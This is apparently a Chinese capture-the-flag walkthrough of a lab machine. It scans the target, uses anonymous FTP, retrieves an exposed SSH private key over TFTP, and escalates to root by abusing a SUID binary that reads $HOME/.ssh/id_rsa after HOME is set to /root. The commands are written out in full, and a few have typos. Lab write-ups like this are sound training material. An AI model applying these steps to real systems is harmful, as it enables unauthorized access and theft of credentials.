主机探活

```
nmap -sn 192.168.56.0/24
```

![image-20250604161003386](./assets/image-20250604161003386.png)

确定靶机ip：192.168.56.109



端口扫描

```
set ip 192.168.56.109
echo $ip
nmap -sT -p- --min-rate 10000 $ip -oN ./portscan
```

![image-20250604161104559](./assets/image-20250604161104559.png)

开放了21，22，80端口



提取端口信息

```
set port $(cat ./portscan | grep open | awk -F'/' '{print $1}' | paste -sd,)
```

![image-20250604161220796](./assets/image-20250604161220796.png)



详细结果扫描

```
sudo nmao -sCV -O -p $port $ip -oN ./detailscan
```

![image-20250604161329969](./assets/image-20250604161329969.png)

分析结果：

- 21：ftp 允许匿名登录
- 22：ssh
- 80：http



UDP扫描

```
sudo nmap -sU --top-port 20 $ip -oN ./udpscan
```

![image-20250604161538770](./assets/image-20250604161538770.png)

tftp端口开放或是过滤状态



访问192.168.56.109

![image-20250604161638321](./assets/image-20250604161638321.png)

出现用户：alexia

并提示id_rsa暴露



目录扫描无结果



匿名登录lftp服务

```
lftp $ip anonymous
ls -al
```

![image-20250604161836120](./assets/image-20250604161836120.png)

存在index.html，但是没内容

存在.web文件夹，其中存在index.html，对应web首页内容



尝试上传php文件

```
echo '<?php echo 123; ?>' > 1.php
php 1.php
```

![image-20250604162110060](./assets/image-20250604162110060.png)

上传

```
cd .web
put 1.php
```

![image-20250604162158068](./assets/image-20250604162158068.png)

访问http://192.168.56.109/1.php

没有解析php代码

```
curl http://192.168.56.109/1.php
```

![image-20250604162247120](./assets/image-20250604162247120.png)



结合前面的提示，id_rsa暴露，且可能存在tftp服务

```
tftp $ip
get id_rsa
```

获取id_rsa文件

![image-20250604162420210](./assets/image-20250604162420210.png)



利用私钥文件登录alexia用户

```
chmod 400 id_rsa
ssh alexia@$ip -i id_rsa
```

![image-20250604162534678](./assets/image-20250604162534678.png)



得到第一个flag

![image-20250604162600598](./assets/image-20250604162600598.png)



查找suid位

```
find / -perm -4000 2>/dev/null
```

![image-20250604162636296](./assets/image-20250604162636296.png)

存在showMetheKey文件

```
file /opt/showMetheKey
```

![image-20250604162726619](./assets/image-20250604162726619.png)

执行该文件

```
/opt/showMetheKey
```

![image-20250604162751598](./assets/image-20250604162751598.png)

获取用户私钥

对比从tftp中获取的id_rsa，内容一致

![image-20250604162839211](./assets/image-20250604162839211.png)

将showMetheKey传回本地

```
scp /opt/showMetheKey ra1n3@192.168.56.107:/home/ra1n3/share
```

![image-20250604162952041](./assets/image-20250604162952041.png)

ida简单查看

![image-20250604163248901](./assets/image-20250604163248901.png)

查看$HOME/.ssh/id_rsa

那么如果我们将$HOME定义为/root，就可以尝试读取root目录下的id_rsa

```
exoirt HOME=/root
echo $HOME
```

![image-20250604163620708](./assets/image-20250604163620708.png)

```
/opt/showMetheKey > id_rsa
cat id_rsa
```

![image-20250604163701095](./assets/image-20250604163701095.png)

成功读取root用户私钥



```
chmod 400 id_rsa
ssh root@127.0.0.1 -i id_rsa
```

![image-20250604163752952](./assets/image-20250604163752952.png)

登录root用户



![image-20250604163831056](./assets/image-20250604163831056.png)

得到flag